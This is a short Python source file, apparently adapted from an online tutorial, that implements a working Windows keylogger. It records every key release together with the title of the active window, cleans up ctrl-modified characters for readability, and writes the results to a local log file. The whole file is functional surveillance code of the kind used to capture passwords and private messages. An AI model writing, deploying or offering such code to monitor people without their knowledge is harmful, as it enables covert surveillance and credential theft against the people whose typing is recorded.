# https://www.tutorialspoint.com/design-a-keylogger-in-python

from pynput.keyboard import Listener
from pynput.keyboard import KeyCode
import logging
import win32gui
#import sys

logging.basicConfig(
    filename = "key_log.txt", 
    level = logging.DEBUG, 
    format = '%(asctime)s  %(message)s'
)
  
def on_release(key):
    w = win32gui
    current_window = w.GetWindowText (w.GetForegroundWindow())
    
    # Revert pynput(1.4.2) hex reattr when ctrl_isDown: 
    # https://stackoverflow.com/questions/56925945/why-my-keylogger-code-randomly-changes-output-between-literal-chars-and-ascii-he/57498051#57498051
    # 'c'                = 'c'
    # Ctrl + 'c'         = '\x03' hex code
    # Shift + Ctrl + 'c' = <67>   ascii unicode or decimal
    
    if type(key) == type(KeyCode()) and '\\' in repr(key):
        if ord(key.char) == 31: # '\x1f' -> '-'
            key = KeyCode(char=chr(45))
        elif ord(key.char) in [27, 29]: # '{}' -> '[]'
            key = KeyCode(char=chr(64 + ord(key.char)))
        else:
            key = KeyCode(char=chr(96 + ord(key.char)))
    elif type(key) == type(KeyCode()) and '<' in repr(key) and '>' in repr(key):
        key = KeyCode(char = chr(key.vk))    
        
    msg = str(key).ljust(18) + " \t " + str(current_window)
    print(msg)
    logging.info(msg)

with Listener(on_release = on_release) as listener:
    listener.join()
